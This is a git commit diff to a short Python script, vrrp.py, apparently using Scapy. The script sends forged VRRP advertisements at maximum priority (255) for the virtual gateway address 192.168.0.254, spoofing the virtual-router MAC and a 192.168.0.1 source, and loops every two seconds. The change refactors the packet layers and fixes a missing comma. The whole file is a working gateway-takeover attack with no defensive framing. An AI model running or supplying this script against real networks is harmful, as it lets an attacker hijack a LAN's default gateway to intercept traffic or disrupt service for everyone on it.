2195d9fb945987387660f2031db9fc40ee7395ad
Daniel Magevski <daniel_magevski@hotmail.com>
2017-11-12 22:57:45 -0200

    Update vrrp.py

--- vrrp.py
+++ vrrp.py
@@ -8,7 +8,8 @@ if os.geteuid() != 0:
 
 print("\nPress Ctrl+C to stop\n")
 
-p = Ether(src="00:00:5e:00:01:01",dst="01:00:5e:00:00:12")/IP(src="192.168.0.1"
-dst="224.0.0.18",ttl=255)/VRRP(priority=255, 
+mac = Ether(src="00:00:5e:00:01:01",dst="01:00:5e:00:00:12")
+ip = IP(src="192.168.0.1", dst="224.0.0.18",ttl=255)
+vrrp = VRRP(priority=255, 
 addrlist=["192.168.0.254"])
-sendp(p, inter=2, loop=1)
+sendp(mac/ip/vrrp, inter=2, loop=1)
